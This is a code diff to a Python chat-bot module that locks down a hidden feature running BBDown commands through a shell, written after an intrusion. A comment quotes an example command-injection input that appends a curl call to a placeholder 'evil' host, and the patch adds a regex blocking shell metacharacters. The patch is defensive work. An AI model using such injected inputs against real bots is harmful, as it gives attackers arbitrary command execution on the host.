@@ -17,7 +17,7 @@ import time
 
 from bot.commands import register, ROLE_ALL, ROLE_ASSISTANT
 from bot.core import tools
-from config import ROOT, BBDOWN_DIR, BBDOWN_EXE, BBDOWN_COOKIE_SRC, FFMPEG_EXE
+from config import ROOT, BBDOWN_DIR, BBDOWN_EXE, BBDOWN_COOKIE_SRC, FFMPEG_EXE, BOT_ADMINS
 
 from . import bbdown_login
 
@@ -472,8 +472,27 @@ async def _download_and_send(ctx, bv, kind):
 
 
 # ---------- 隐藏功能：执行 BBDown 命令 ----------
+# ★ 安全（2026-10-16 实网被入侵后加固）：
+#   tools.run_script 走的是 create_subprocess_shell（shell=True），
+#   而这里的 text 是**用户原样输入**，早年直接拼进命令行 ⇒ 任何人发
+#   「BBDown xxx;curl http://evil/p」都能以 bot 进程身份（root）执行任意命令。
+#   实测对方已成功投递（在 /tmp 建出目录并拿到 dnslog 回连），故加两道闸：
+#     1) 只有 BOT_ADMINS 能用（注意：伪造 openid 可绕过这道，真正兜底的是第 2 道）
+#     2) 拒绝一切 shell 元字符 —— 这是实际拦住注入的那道
+_SHELL_META_RE = re.compile(r"[;&|`$<>\n\r\\]")
+
+
 async def _run_bbdown_command(ctx, text):
     """执行用户发送的 BBDown 详细命令，并发送下载的内容。"""
+    if getattr(ctx, "openid", None) not in (BOT_ADMINS or []):
+        await ctx.reply_text("喵？这个隐藏功能只有管理员能用喵")
+        return
+    if _SHELL_META_RE.search(text or ""):
+        await ctx.reply_text(
+            "喵，命令里有不允许的字符（; & | ` $ < > \\ 换行）～\n"
+            "BBDown 命令只能是一行纯参数，不能拼接其它命令。"
+        )
+        return
     workdir = _fresh_workdir()
     try:
         await ctx.reply_text("保证完成任务喵！")
